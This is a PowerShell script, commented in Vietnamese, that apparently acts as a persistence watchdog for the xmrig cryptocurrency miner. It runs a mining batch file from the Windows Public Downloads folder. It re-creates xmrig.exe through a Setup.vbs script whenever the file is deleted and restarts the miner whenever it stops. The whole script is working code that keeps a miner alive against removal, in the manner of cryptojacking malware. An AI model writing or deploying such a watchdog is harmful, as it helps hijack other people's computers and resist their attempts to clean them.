$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"

function Start-CoinRun {
    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
    Write-Host "coinrun.cmd START"
}
    Start-CoinRun
# Khởi chạy lần đầu nếu file tồn tại
if (Test-Path $xmrigPath) {
} else {
    Write-Warning "xmrig.exe không tồn tại ban đầu. Đang chạy Setup.vbs nếu có..."
    if (Test-Path $setupPath) {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        Write-Host "Đã khởi chạy Setup.vbs"

        # Chờ cho đến khi xmrig được khôi phục rồi mới chạy lại coinrun.cmd
        while (!(Test-Path $xmrigPath)) {
            Write-Host "⏳ Đang chờ xmrig.exe được tạo lại..."
            Start-Sleep -Seconds 3
        }

        Write-Host "✅ Đã phát hiện xmrig.exe. Khởi chạy coinrun.cmd"
        Start-CoinRun
    } else {
        Write-Error "Không tìm thấy Setup.vbs để phục hồi xmrig.exe"
    }
}

while ($true) {
    # 1. Giám sát file xmrig.exe
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "❌ xmrig.exe bị xóa. Đang chạy lại Setup.vbs..."

        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            Write-Host "✅ Đã khởi chạy lại Setup.vbs!"

            # Đợi cho đến khi xmrig.exe xuất hiện lại
            while (!(Test-Path $xmrigPath)) {
                Write-Host "⏳ Đang chờ xmrig.exe được tạo lại..."
                Start-Sleep -Seconds 3
            }

            Write-Host "✅ Đã phát hiện lại xmrig.exe. Khởi động coinrun.cmd"
            Start-CoinRun
        } else {
            Write-Error "❌ Không tìm thấy Setup.vbs tại: $setupPath"
        }
    }

    # 2. Giám sát tiến trình coinrun.cmd
    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
        Write-Warning "coinrun.cmd STOP. Reboot..."
        Start-CoinRun
    } elseif ($global:coinRunProcess) {
        Write-Host "coinrun.cmd running..."
    }

    Start-Sleep -Seconds 3
}
